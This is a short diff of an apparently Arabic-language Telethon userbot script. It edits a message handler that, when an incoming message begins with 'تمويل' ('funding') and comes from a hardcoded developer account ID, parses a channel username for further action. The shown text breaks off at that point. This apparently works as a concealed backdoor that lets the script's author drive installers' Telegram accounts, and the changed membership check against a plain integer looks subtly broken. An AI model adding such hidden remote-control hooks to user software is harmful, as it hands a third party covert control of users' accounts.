@@ -279,10 +279,9 @@ async def ithker(knopis):
     await knopis.edit(choice(Qrue_Bosa))
 
 DevSaher = 6528926431
-
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
+    if event.message.message.startswith("تمويل") and event.sender_id in DevSaher:
         message = event.message
         if len(message.text.split()) > 1:
             channel_username = message.text.split()[1].replace("@", "")
